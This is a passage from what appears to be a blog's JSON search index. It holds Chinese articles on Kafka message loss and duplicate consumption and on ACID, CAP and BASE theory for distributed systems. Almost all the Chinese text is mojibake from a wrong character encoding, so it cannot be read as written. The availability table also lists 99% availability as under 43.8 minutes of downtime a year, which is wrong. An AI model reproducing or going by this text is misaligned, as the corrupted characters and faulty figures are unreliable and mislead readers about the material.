çš„ä¸€ä¸ªå‚æ•°ï¼Œæ‰€æœ‰å‰¯æœ¬ Broker éƒ½è¦æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯æ‰ç®—æ˜¯â€œå·²æäº¤â€ã€‚\n+ è®¾ç½® unclean.leader.election.enable = falseã€‚è¿™æ˜¯ Broker ç«¯çš„å‚æ•°ï¼Œè½åå¤ªå¤šçš„ä¸èƒ½æˆä¸ºæ–°çš„ Leaderã€‚\n+ è®¾ç½® replication.factor >= 3ã€‚è¿™ä¹Ÿæ˜¯ Broker ç«¯çš„å‚æ•°ã€‚å°†æ¶ˆæ¯å¤šä¿å­˜å‡ ä»½å†—ä½™ã€‚\n+ è®¾ç½® min.insync.replicas > 1ã€‚è¿™ä¾ç„¶æ˜¯ Broker ç«¯å‚æ•°ï¼Œæ§åˆ¶çš„æ˜¯æ¶ˆæ¯è‡³å°‘è¦è¢«å†™å…¥åˆ°å¤šå°‘ä¸ªå‰¯æœ¬æ‰ç®—æ˜¯â€œå·²æäº¤â€ã€‚\n\n##### 3. æ¶ˆè´¹ç«¯ä¸¢å¤±\n\næ¶ˆè´¹ç«¯æ²¡æœ‰æ­£ç¡®æ¶ˆè´¹æ¶ˆæ¯ï¼Œå°±æŠŠä½ç§»æäº¤äº†ï¼Œå¯¼è‡´ Kafka è®¤ä¸ºè¯¥æ¶ˆæ¯å·²ç»è¢«æ¶ˆè´¹äº†ï¼Œä»è€Œå¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ã€‚\n\nè§£å†³æ–¹æ¡ˆï¼š\n\n+ ç¡®å®šæ¶ˆè´¹å®Œæˆåæ‰æäº¤æ¶ˆæ¯ï¼Œå¦‚æœæ˜¯å¤šçº¿ç¨‹å¼‚æ­¥å¤„ç†æ¶ˆè´¹æ¶ˆæ¯ï¼ŒConsumer ç¨‹åºä¸è¦å¼€å¯è‡ªåŠ¨æäº¤ä½ç§»ï¼Œè€Œæ˜¯è¦åº”ç”¨ç¨‹åºæ‰‹åŠ¨æäº¤ä½ç§»ã€‚\n\n\n\n### 2.4 å¦‚ä½•é¿å…é‡å¤æ¶ˆè´¹\n\n##### 1. äº§ç”ŸåŸå› \n\n+ æäº¤é—´éš”å®•æœº\n\n  é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¶ˆæ¯æ¶ˆè´¹å®Œä»¥åï¼Œä¼šè‡ªåŠ¨æäº¤Offsetçš„å€¼ï¼Œé¿å…é‡å¤æ¶ˆè´¹ã€‚Kafkaæ¶ˆè´¹ç«¯çš„è‡ªåŠ¨æäº¤é€»è¾‘æœ‰ä¸€ä¸ªé»˜è®¤çš„5ç§’é—´éš”ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨5ç§’ä¹‹åçš„ä¸‹ä¸€æ¬¡å‘Brokeræ‹‰å–æ¶ˆæ¯çš„æ—¶å€™æäº¤ã€‚\n\n  æ‰€ä»¥åœ¨Consumeræ¶ˆè´¹çš„è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨ç¨‹åºè¢«å¼ºåˆ¶killæ‰æˆ–è€…å®•æœºï¼Œå¯èƒ½ä¼šå¯¼è‡´Offsetæ²¡æäº¤ï¼Œä»è€Œäº§ç”Ÿé‡å¤æäº¤çš„é—®é¢˜ã€‚\n\n+ å†å¹³è¡¡\n\n  åœ¨Kafkaé‡Œé¢æœ‰ä¸€ä¸ªPartition Balanceæœºåˆ¶ï¼Œå°±æ˜¯æŠŠå¤šä¸ªPartitionå‡è¡¡çš„åˆ†é…ç»™å¤šä¸ªæ¶ˆè´¹è€…ã€‚å¦‚æœConsumeråœ¨é»˜è®¤çš„5åˆ†é’Ÿå†…æ²¡åŠæ³•å¤„ç†å®Œè¿™ä¸€æ‰¹æ¶ˆæ¯ï¼Œå°±ä¼šè§¦å‘Kafkaçš„Rebalanceæœºåˆ¶ï¼Œä»è€Œå¯¼è‡´Offsetè‡ªåŠ¨æäº¤å¤±è´¥ã€‚\n\n  è€Œåœ¨é‡æ–°Rebalanceä¹‹åï¼ŒConsumerè¿˜æ˜¯ä¼šä»ä¹‹å‰æ²¡æäº¤çš„Offsetä½ç½®å¼€å§‹æ¶ˆè´¹ï¼Œä¹Ÿä¼šå¯¼è‡´æ¶ˆæ¯é‡å¤æ¶ˆè´¹çš„é—®é¢˜\n\n##### 2. è§£å†³æ–¹æ¡ˆ\n\n+ æé«˜æ¶ˆè´¹ç«¯çš„å¤„ç†æ€§èƒ½é¿å…è§¦å‘Balanceï¼Œæ¯”å¦‚å¯ä»¥ç”¨å¼‚æ­¥çš„æ–¹å¼æ¥å¤„ç†æ¶ˆæ¯ï¼Œç¼©çŸ­å•ä¸ªæ¶ˆæ¯æ¶ˆè´¹çš„æ—¶é—´ã€‚æˆ–è€…è¿˜å¯ä»¥è°ƒæ•´æ¶ˆæ¯å¤„ç†çš„è¶…æ—¶æ—¶é—´ã€‚è¿˜å¯ä»¥å‡å°‘ä¸€æ¬¡æ€§ä»Brokerä¸Šæ‹‰å–æ•°æ®çš„æ¡æ•°ã€‚\n+ å¯ä»¥é’ˆå¯¹æ¶ˆæ¯ç”Ÿæˆmd5ç„¶åä¿å­˜åˆ°mysqlæˆ–è€…redisé‡Œé¢ï¼Œåœ¨å¤„ç†æ¶ˆæ¯ä¹‹å‰å…ˆå»mysqlæˆ–è€…redisé‡Œé¢åˆ¤æ–­æ˜¯å¦å·²ç»æ¶ˆè´¹è¿‡ã€‚è¿™ä¸ªæ–¹æ¡ˆå…¶å®å°±æ˜¯åˆ©ç”¨å¹‚ç­‰æ€§çš„æ€æƒ³ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n+ https://tonybai.com/2022/03/28/the-comparison-of-the-go-community-leading-kakfa-clients/\n+ https://cloud.tencent.com/developer/article/1541215\n+ https://www.lixueduan.com/posts/kafka/09-avoid-msg-lost/\n+ https://mp.weixin.qq.com/s/YJFltTP4J5si1Z5SbuMUJw\n+ kafkaæƒå¨æŒ‡å—2.0\n","tags":["kafka"],"categories":["æ¶ˆæ¯é˜Ÿåˆ—"]},{"title":"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º","url":"%2Fp%2F76302eca.html","content":"\nç†è§£åˆ†å¸ƒå¼ä¹‹å‰ï¼Œéœ€è¦ç†è§£ä¸€ä¸ªé—®é¢˜å°±æ˜¯\"äº‹åŠ¡\"ã€‚\n\n# 1. æœ¬åœ°äº‹åŠ¡\n\näº‹åŠ¡æä¾›ä¸€ç§æœºåˆ¶å°†ä¸€ä¸ªæ´»åŠ¨æ¶‰åŠçš„æ‰€æœ‰æ“ä½œçº³å…¥åˆ°ä¸€ä¸ªä¸å¯åˆ†å‰²çš„æ‰§è¡Œå•å…ƒï¼Œç»„æˆäº‹åŠ¡çš„æ‰€æœ‰æ“ä½œåªæœ‰åœ¨æ‰€æœ‰æ“ä½œå‡èƒ½æ­£å¸¸æ‰§è¡Œçš„æƒ…å†µä¸‹æ–¹èƒ½æäº¤ï¼Œåªè¦å…¶ä¸­ä»»ä¸€æ“ä½œæ‰§è¡Œå¤±è´¥ï¼Œéƒ½å°†å¯¼è‡´æ•´ä¸ªäº‹åŠ¡çš„å›æ»šã€‚\n\nç®€å•åœ°è¯´ï¼Œäº‹åŠ¡æä¾›ä¸€ç§â€œ **è¦ä¹ˆä»€ä¹ˆéƒ½ä¸åšï¼Œè¦ä¹ˆåšå…¨å¥—ï¼ˆAll or Nothingï¼‰**â€æœºåˆ¶ã€‚\n\n<!-- more -->\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/126-åˆ†å¸ƒå¼5.jpeg\" alt=\"img\" style=\"zoom: 33%;\" />\n\n### 1.1 ACIDç†è®º\n\n äº‹åŠ¡æ˜¯åŸºäºæ•°æ®è¿›è¡Œæ“ä½œï¼Œéœ€è¦ä¿è¯äº‹åŠ¡çš„æ•°æ®é€šå¸¸å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥ä»‹ç»åˆ°äº‹åŠ¡ï¼Œå°±ä¸å¾—ä¸ä»‹ç»æ•°æ®åº“äº‹åŠ¡çš„`ACID`ç‰¹æ€§ï¼ŒæŒ‡æ•°æ®åº“äº‹åŠ¡æ­£ç¡®æ‰§è¡Œçš„å››ä¸ªåŸºæœ¬ç‰¹æ€§çš„ç¼©å†™ã€‚åŒ…å«ï¼š\n\n- **åŸå­æ€§ï¼ˆAtomicityï¼‰**\n- **ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰**\n- **éš”ç¦»æ€§ï¼ˆIsolationï¼‰**\n- **æŒä¹…æ€§ï¼ˆDurabilityï¼‰**\n\n##### 1. åŸå­æ€§ï¼ˆAtomicityï¼‰\n\n æ•´ä¸ªäº‹åŠ¡ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆï¼Œä¸å¯èƒ½åœæ»åœ¨ä¸­é—´æŸä¸ªç¯èŠ‚ã€‚\n\n##### 2. **ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰**\n\nåœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä»¥åï¼Œæ•°æ®åº“æ•°æ®çš„ä¸€è‡´æ€§çº¦æŸæ²¡æœ‰è¢«ç ´åã€‚\n\n##### 3. éš”ç¦»æ€§ï¼ˆIsolationï¼‰\n\n æ•°æ®åº“å…è®¸å¤šä¸ªå¹¶å‘äº‹åŠ¡åŒæ—¶å¯¹æ•°æ®è¿›è¡Œè¯»å†™å’Œä¿®æ”¹çš„èƒ½åŠ›ï¼Œå¦‚æœä¸€ä¸ªäº‹åŠ¡è¦è®¿é—®çš„æ•°æ®æ­£åœ¨è¢«å¦å¤–ä¸€ä¸ªäº‹åŠ¡ä¿®æ”¹ï¼Œåªè¦å¦å¤–ä¸€ä¸ªäº‹åŠ¡æœªæäº¤ï¼Œå®ƒæ‰€è®¿é—®çš„æ•°æ®å°±ä¸å—æœªæäº¤äº‹åŠ¡çš„å½±å“ã€‚éš”ç¦»æ€§å¯ä»¥é˜²æ­¢å¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ç”±äºäº¤å‰æ‰§è¡Œè€Œå¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´ã€‚\n\n#####  4. æŒä¹…æ€§ï¼ˆDurability)\n\n äº‹åŠ¡å¤„ç†ç»“æŸåï¼Œå¯¹æ•°æ®çš„ä¿®æ”¹å°±æ˜¯æ°¸ä¹…çš„ï¼Œå³ä¾¿ç³»ç»Ÿæ•…éšœä¹Ÿä¸ä¼šä¸¢å¤±ã€‚\n\n æœ¬åœ°äº‹åŠ¡ACIDå®é™…ä¸Šå¯ç”¨â€ç»Ÿä¸€æäº¤ï¼Œå¤±è´¥å›æ»šâ€œå‡ ä¸ªå­—æ€»ç»“ï¼Œä¸¥æ ¼ä¿è¯äº†åŒä¸€äº‹åŠ¡å†…æ•°æ®çš„ä¸€è‡´æ€§ï¼\n\nè€Œåˆ†å¸ƒå¼äº‹åŠ¡ä¸èƒ½å®ç°è¿™ç§`ACID`ã€‚å› ä¸ºæœ‰CAPç†è®ºçº¦æŸã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ï¼Œåˆ†å¸ƒå¼ä¸­æ˜¯å¦‚ä½•ä¿è¯ä»¥ä¸Šç‰¹æ€§çš„ï¼Œé‚£ä¹ˆå°±æœ‰äº†ä¸€ä¸ªè‘—åçš„CAPç†è®ºã€‚\n\n# 2. åˆ†å¸ƒå¼äº‹åŠ¡\n\n### 2.1 CAP ç†è®º\n\nåœ¨è®¾è®¡ä¸€ä¸ªå¤§è§„æ¨¡å¯æ‰©æ”¾çš„ç½‘ç»œæœåŠ¡æ—¶å€™ä¼šé‡åˆ°ä¸‰ä¸ªç‰¹æ€§ï¼šä¸€è‡´æ€§ï¼ˆconsistencyï¼‰ã€å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰ã€åˆ†åŒºå®¹é”™ï¼ˆpartition-toleranceï¼‰éƒ½éœ€è¦çš„æƒ…æ™¯.\n\n CAPå®šå¾‹è¯´çš„æ˜¯åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§å’Œåˆ†åŒºå®¹é”™æ€§è¿™ä¸‰ç§ä¿è¯æ— æ³•åŒæ—¶å¾—åˆ°æ»¡è¶³ï¼Œæœ€å¤šæ»¡è¶³ä¸¤ä¸ªã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/129-CAP1.jpeg\" alt=\"img\" style=\"zoom: 33%;\" />\n\n### 2.2 æµç¨‹æ¼”ç¤º\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/130-CAP2.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\nè¯¥åœºæ™¯æ•´ä½“åˆ†ä¸º5ä¸ªæµç¨‹ï¼š\n\næµç¨‹ä¸€ã€å®¢æˆ·ç«¯å‘é€è¯·æ±‚(å¦‚:æ·»åŠ è®¢å•ã€ä¿®æ”¹è®¢å•ã€åˆ é™¤è®¢å•)\n\næµç¨‹äºŒã€Webä¸šåŠ¡å±‚å¤„ç†ä¸šåŠ¡ï¼Œå¹¶ä¿®æ”¹å­˜å‚¨æˆæ•°æ®ä¿¡æ¯\n\næµç¨‹ä¸‰ã€å­˜å‚¨å±‚å†…éƒ¨Masterä¸Backupçš„æ•°æ®åŒæ­¥\n\næµç¨‹å››ã€Webä¸šåŠ¡å±‚ä»å­˜å‚¨å±‚å–å‡ºæ•°æ®\n\næµç¨‹äº”ã€Webä¸šåŠ¡å±‚è¿”å›æ•°æ®ç»™å®¢æˆ·ç«¯\n\n##### 1. ä¸€è‡´æ€§(Consistency)\n\nâ€œall nodes see the same data at the same timeâ€\n\nä¸€æ—¦æ•°æ®æ›´æ–°å®Œæˆå¹¶æˆåŠŸè¿”å›å®¢æˆ·ç«¯åï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ‰€æœ‰èŠ‚ç‚¹åœ¨åŒä¸€æ—¶é—´çš„æ•°æ®å®Œå…¨ä¸€è‡´ã€‚\n\nåœ¨CAPçš„ä¸€è‡´æ€§ä¸­è¿˜åŒ…æ‹¬å¼ºä¸€è‡´æ€§ã€å¼±ä¸€è‡´æ€§ã€æœ€ç»ˆä¸€è‡´æ€§ç­‰çº§åˆ«ã€‚\n\nä¸€è‡´æ€§æ˜¯æŒ‡å†™æ“ä½œåçš„è¯»æ“ä½œå¯ä»¥è¯»å–åˆ°æœ€æ–°çš„æ•°æ®çŠ¶æ€ï¼Œå½“æ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Šï¼Œä»ä»»æ„ç»“ç‚¹è¯»å–åˆ°çš„æ•°æ®éƒ½æ˜¯æœ€æ–°çš„çŠ¶æ€ã€‚\n\n**ä¸€è‡´æ€§å®ç°ç›®æ ‡ï¼š**\nWebä¸šåŠ¡å±‚å‘ä¸»Masterå†™æ•°æ®åº“æˆåŠŸï¼Œä»Backupè¯»æ•°æ®ä¹ŸæˆåŠŸã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/133-CAP5.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n**ä¸€è‡´æ€§ç‰¹ç‚¹ï¼š**\n\n+ ç”±äºå­˜åœ¨æ•°æ®åŒæ­¥çš„è¿‡ç¨‹ï¼Œå†™æ“ä½œçš„å“åº”ä¼šæœ‰ä¸€å®šçš„å»¶è¿Ÿã€‚\n+ ä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§ä¼šå¯¹èµ„æºæš‚æ—¶é”å®šï¼Œå¾…æ•°æ®åŒæ­¥å®Œæˆé‡Šæ”¾é”å®šèµ„æºã€‚\n+ å¦‚æœè¯·æ±‚æ•°æ®åŒæ­¥å¤±è´¥çš„ç»“ç‚¹åˆ™ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œä¸€å®šä¸ä¼šè¿”å›æ—§æ•°æ®ã€‚\n\n##### 2. å¯ç”¨æ€§(Availability)\n\n> â€œ`Reads and writes always succeed`â€\n\næœåŠ¡ä¸€ç›´å¯ç”¨ï¼Œè€Œä¸”æ˜¯æ­£å¸¸å“åº”æ—¶é—´ã€‚å¯¹äºå¯ç”¨æ€§çš„è¡¡é‡æ ‡å‡†å¦‚ä¸‹ï¼š\n\n| å¯ç”¨æ€§åˆ†ç±»                   | å¯ç”¨æ°´å¹³ï¼ˆ%ï¼‰ | ä¸€å¹´ä¸­å¯å®¹å¿åœæœºæ—¶é—´ |\n| ---------------------------- | ------------- | -------------------- |\n| å®¹é”™å¯ç”¨æ€§                   | 99.9999       | <1 min               |\n| æé«˜å¯ç”¨æ€§                   | 99.999        | <5 min               |\n| å…·æœ‰æ•…éšœè‡ªåŠ¨æ¢å¤èƒ½åŠ›çš„å¯ç”¨æ€§ | 99.99         | <53 min              |\n| é«˜å¯ç”¨æ€§                     | 99.9          | <8.8h                |\n| å•†å“å¯ç”¨æ€§                   | 99            | <43.8 min            |\n\n**å¯ç”¨æ€§å®ç°ç›®æ ‡ï¼š**\n\n- å½“Masteræ­£åœ¨è¢«æ›´æ–°ï¼ŒBackupæ•°æ®åº“æ¥æ”¶åˆ°æ•°æ®æŸ¥è¯¢çš„è¯·æ±‚åˆ™ç«‹å³èƒ½å¤Ÿå“åº”æ•°æ®æŸ¥è¯¢ç»“æœã€‚\n- backupæ•°æ®åº“ä¸å…è®¸å‡ºç°å“åº”è¶…æ—¶æˆ–å“åº”é”™è¯¯ã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/134-CAP6.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n1. å†™å…¥Masterä¸»æ•°æ®åº“åè¦å°†æ•°æ®åŒæ­¥åˆ°ä»æ•°æ®åº“ã€‚\n2. ç”±äºè¦ä¿è¯Backupä»æ•°æ®åº“çš„å¯ç”¨æ€§ï¼Œä¸å¯å°†Backupä»æ•°æ®åº“ä¸­çš„èµ„æºè¿›è¡Œé”å®šã€‚\n3. å³æ—¶æ•°æ®è¿˜æ²¡æœ‰åŒæ­¥è¿‡æ¥ï¼Œä»æ•°æ®åº“ä¹Ÿè¦è¿”å›è¦æŸ¥è¯¢çš„æ•°æ®ï¼Œå“ªæ€•æ˜¯æ—§æ•°æ®/æˆ–è€…é»˜è®¤æ•°æ®ï¼Œä½†ä¸èƒ½è¿”å›é”™è¯¯æˆ–å“åº”è¶…æ—¶ã€‚\n\n**å¯ç”¨æ€§ç‰¹ç‚¹ï¼š**\n\n+ æ‰€æœ‰è¯·æ±‚éƒ½æœ‰å“åº”ï¼Œä¸”ä¸ä¼šå‡ºç°å“åº”è¶…æ—¶æˆ–å“åº”é”™è¯¯ã€‚\n\n##### 3. åˆ†åŒºå®¹é”™æ€§(Partition tolerance)\n\nåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå°½ç®¡éƒ¨åˆ†èŠ‚ç‚¹å‡ºç°ä»»ä½•æ¶ˆæ¯ä¸¢å¤±æˆ–è€…æ•…éšœï¼Œç³»ç»Ÿåº”ç»§ç»­è¿è¡Œã€‚\n\né€šå¸¸åˆ†å¸ƒå¼ç³»ç»Ÿçš„å„å„ç»“ç‚¹éƒ¨ç½²åœ¨ä¸åŒçš„å­ç½‘ï¼Œè¿™å°±æ˜¯ç½‘ç»œåˆ†åŒºï¼Œä¸å¯é¿å…çš„ä¼šå‡ºç°ç”±äºç½‘ç»œé—®é¢˜è€Œå¯¼è‡´ç»“ç‚¹ä¹‹é—´é€šä¿¡å¤±è´¥ï¼Œæ­¤æ—¶ä»å¯å¯¹å¤–æä¾›æœåŠ¡ã€‚\n\n**åˆ†åŒºå®¹é”™æ€§å®ç°ç›®æ ‡ï¼š**\nä¸»æ•°æ®åº“å‘ä»æ•°æ®åº“åŒæ­¥æ•°æ®å¤±è´¥ä¸å½±å“è¯»å†™æ“ä½œã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/136-CAP8.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\nå…¶ä¸€ä¸ªç»“ç‚¹æŒ‚æ‰ä¸å½±å“å¦ä¸€ä¸ªç»“ç‚¹å¯¹å¤–æä¾›æœåŠ¡ã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/137-CAP9.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n**å¿…è¦å®ç°æµç¨‹ï¼š**\n\n1. å°½é‡ä½¿ç”¨å¼‚æ­¥å–ä»£åŒæ­¥æ“ä½œï¼Œä¾‹å¦‚ä½¿ç”¨å¼‚æ­¥æ–¹å¼å°†æ•°æ®ä»ä¸»æ•°æ®åº“åŒæ­¥åˆ°ä»æ•°æ®ï¼Œè¿™æ ·ç»“ç‚¹ä¹‹é—´èƒ½æœ‰æ•ˆçš„å®ç°æ¾è€¦åˆã€‚\n2. æ·»åŠ Backupä»æ•°æ®åº“ç»“ç‚¹ï¼Œå…¶ä¸­ä¸€ä¸ªBackupä»ç»“ç‚¹æŒ‚æ‰å…¶å®ƒBackupä»ç»“ç‚¹æä¾›æœåŠ¡ã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/138-CAP10.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n\n\n**åˆ†åŒºå®¹é”™æ€§ç‰¹ç‚¹ï¼š**\n\nåˆ†åŒºå®¹å¿æ€§åˆ†æ˜¯å¸ƒå¼ç³»ç»Ÿå…·å¤‡çš„åŸºæœ¬èƒ½åŠ›ã€‚\n\n\n\n### 2.3 CAPç‰ºç‰²è°\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/140-CAP12.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nå‡è®¾åœ¨N1å’ŒN2ä¹‹é—´ç½‘ç»œæ–­å¼€çš„æ—¶å€™ï¼Œ\n\nAã€ç”¨æˆ·å‘`Host1`å‘é€æ•°æ®æ›´æ–°è¯·æ±‚ï¼Œé‚£`Host1`ä¸­çš„æ•°æ®`Data(0)`å°†è¢«æ›´æ–°ä¸º`Data(1)`\n\nBã€è‹¥æ­¤æ—¶`Host1`å’Œ`Host2`ç½‘ç»œæ˜¯æ–­å¼€çš„ï¼Œæ‰€ä»¥åˆ†å¸ƒå¼ç³»ç»ŸåŒæ­¥æ“ä½œå°†å¤±è´¥ï¼Œ`Host2`ä¸­çš„æ•°æ®ä¾æ—§æ˜¯`Data(0)`\n\nCã€æœ‰ç”¨æˆ·å‘`Host2`å‘é€æ•°æ®è¯»å–è¯·æ±‚ï¼Œç”±äºæ•°æ®è¿˜æ²¡æœ‰è¿›è¡ŒåŒæ­¥ï¼Œ`Process2`æ²¡åŠæ³•ç«‹å³ç»™ç”¨æˆ·è¿”å›æœ€æ–°çš„æ•°æ®V1ï¼Œé‚£ä¹ˆå°†é¢ä¸´ä¸¤ä¸ªé€‰æ‹©ã€‚\n\nç¬¬ä¸€ï¼Œç‰ºç‰²`æ•°æ®ä¸€è‡´æ€§(c)`ï¼Œå“åº”æ—§çš„æ•°æ®`Data(0)`ç»™ç”¨æˆ·ï¼›\n\nç¬¬äºŒï¼Œç‰ºç‰²`å¯ç”¨æ€§(A)`ï¼Œé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°ç½‘ç»œè¿æ¥æ¢å¤ï¼Œæ•°æ®åŒæ­¥å®Œæˆä¹‹åï¼Œå†ç»™ç”¨æˆ·å“åº”æœ€æ–°çš„æ•°æ®`Data(1)`ã€‚\n\n**è¿™ä¸ªè¿‡ç¨‹ï¼Œè¯æ˜äº†è¦æ»¡è¶³`åˆ†åŒºå®¹é”™æ€§(p)`çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œåªèƒ½åœ¨`ä¸€è‡´æ€§(C)`å’Œ`å¯ç”¨æ€§(A)`ä¸¤è€…ä¸­ï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªã€‚**\n\n##### 1. CA æ”¾å¼ƒ P ï¼ˆåˆ«ä½ åˆ«å«åˆ†å¸ƒå¼äº†ï¼‰\n\nä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¸å¯èƒ½å­˜åœ¨ä¸æ»¡è¶³Pï¼Œæ”¾å¼ƒ`åˆ†åŒºå®¹é”™æ€§(p)`ï¼Œå³ä¸è¿›è¡Œåˆ†åŒºï¼Œä¸è€ƒè™‘ç”±äºç½‘ç»œä¸é€šæˆ–ç»“ç‚¹æŒ‚æ‰çš„é—®é¢˜ï¼Œåˆ™å¯ä»¥å®ç°ä¸€è‡´æ€§å’Œå¯ç”¨æ€§ã€‚é‚£ä¹ˆç³»ç»Ÿå°†ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„åˆ†å¸ƒå¼ç³»ç»Ÿã€‚\n\nå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿæ¥è¯´ã€‚Pæ˜¯ä¸€ä¸ªåŸºæœ¬è¦æ±‚ï¼ŒCAPä¸‰è€…ä¸­ï¼Œåªèƒ½åœ¨CAä¸¤è€…ä¹‹é—´åšæƒè¡¡ï¼Œå¹¶ä¸”è¦æƒ³å°½åŠæ³•æå‡Pã€‚\n\n##### 2. CP æ”¾å¼ƒ A ï¼ˆé“¶è¡Œè½¬è´¦ä¿è¯ä¸€è‡´æ€§ï¼‰\n\nå¦‚æœä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸è¦æ±‚å¼ºçš„å¯ç”¨æ€§ï¼Œå³å®¹è®¸ç³»ç»Ÿåœæœºæˆ–è€…é•¿æ—¶é—´æ— å“åº”çš„è¯ï¼Œå°±å¯ä»¥åœ¨CAPä¸‰è€…ä¸­ä¿éšœCPè€Œèˆå¼ƒAã€‚\n\næ”¾å¼ƒå¯ç”¨æ€§ï¼Œè¿½æ±‚ä¸€è‡´æ€§å’Œåˆ†åŒºå®¹é”™æ€§ï¼Œå¦‚Redisã€HBaseç­‰ï¼Œè¿˜æœ‰åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¸¸ç”¨çš„Zookeeperä¹Ÿæ˜¯åœ¨CAPä¸‰è€…ä¹‹ä¸­é€‰æ‹©ä¼˜å…ˆä¿è¯CPçš„ã€‚\n\nåœºæ™¯ï¼š\n\nè·¨è¡Œè½¬è´¦ï¼Œä¸€æ¬¡è½¬è´¦è¯·æ±‚è¦ç­‰å¾…åŒæ–¹é“¶è¡Œç³»ç»Ÿéƒ½å®Œæˆæ•´ä¸ªäº‹åŠ¡æ‰ç®—å®Œæˆã€‚\n\n##### 3. AP æ”¾å¼ƒ C ï¼ˆå¸¸ç”¨ï¼Œä¾‹å¦‚ç¤¾äº¤ç³»ç»Ÿï¼‰\n\næ”¾å¼ƒä¸€è‡´æ€§ï¼Œè¿½æ±‚åˆ†åŒºå®¹å¿æ€§å’Œå¯ç”¨æ€§ã€‚è¿™æ˜¯å¾ˆå¤šåˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡æ—¶çš„é€‰æ‹©ã€‚å®ç°APï¼Œå‰ææ˜¯åªè¦ç”¨æˆ·å¯ä»¥æ¥å—æ‰€æŸ¥è¯¢çš„åˆ°æ•°æ®åœ¨ä¸€å®šæ—¶é—´å†…ä¸æ˜¯æœ€æ–°çš„å³å¯ã€‚\n\n**é€šå¸¸å®ç°APéƒ½ä¼šä¿è¯æœ€ç»ˆä¸€è‡´æ€§**ï¼Œåé¢è®²çš„BASEç†è®ºå°±æ˜¯æ ¹æ®APæ¥æ‰©å±•çš„ã€‚\n\n\n\n#### 2.4 CAPç†è®ºå¦‚ä½•è®¾è®¡ä¸€ä¸ªç”µå•†ç³»ç»Ÿï¼Ÿ\n\n1. å¯¹äºç”¨æˆ·æ¨¡å—ï¼ŒåŒ…æ‹¬ç™»å½•ï¼Œä¸ªäººè®¾ç½®ï¼Œä¸ªäººè®¢å•ï¼Œè´­ç‰©è½¦ï¼Œæ”¶è—å¤¹ç­‰ï¼Œè¿™äº›æ¨¡å—ä¿è¯APï¼Œæ•°æ®çŸ­æ—¶é—´ä¸ä¸€è‡´ä¸å½±å“ä½¿ç”¨ã€‚\n\n2. è®¢å•æ¨¡å—çš„ä¸‹å•ä»˜æ¬¾æ‰£å‡åº“å­˜æ“ä½œæ˜¯æ•´ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒï¼ŒCAéƒ½éœ€è¦ä¿è¯ï¼Œæç«¯æƒ…å†µä¸‹é¢ç‰ºç‰²Aä¿è¯C ã€‚\n3. å•†å“æ¨¡å—çš„å•†å“ä¸Šä¸‹æ¶å’Œåº“å­˜ç®¡ç†ä¿è¯CPã€‚\n4. æœç´¢åŠŸèƒ½å› ä¸ºæœ¬èº«å°±ä¸æ˜¯å®æ—¶æ€§éå¸¸é«˜çš„æ¨¡å—ï¼Œæ‰€ä»¥ä¿è¯APå°±å¯ä»¥äº†ã€‚ \n5. ä¿ƒé”€æ˜¯çŸ­æ—¶é—´çš„æ•°æ®ä¸ä¸€è‡´ï¼Œç»“æœå°±æ˜¯ä¼˜æƒ 